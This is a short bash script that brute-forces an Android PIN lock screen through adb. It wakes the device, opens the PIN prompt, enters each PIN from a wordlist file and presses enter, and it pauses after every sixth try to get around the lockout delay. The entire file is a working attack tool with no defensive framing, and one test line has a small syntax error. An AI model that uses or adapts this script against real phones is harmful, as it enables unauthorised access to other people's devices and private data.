#!/bin/bash
echo --------------------------
echo "BRUTE FORCE ATTACK BEGINS"
echo --------------------------

adb shell input keyevent 26 # turns lockscreen on or off
adb shell input keyevent 82 # turns to pin screen

count=1
for i in $(cat /home/rawleyperetz/Desktop/brute_number_four.txt);
do
  condition=$((${count}%6))
  if [ $condition -eq 0]; then
  sleep 30
  fi
  adb shell input text $i # enters pin in string format, i think :)
  sleep 2
  adb shell input keyevent 66 # presses okay or enters pin
  echo $count:$i
  count=$(($count + 1))
done
echo "Finished"






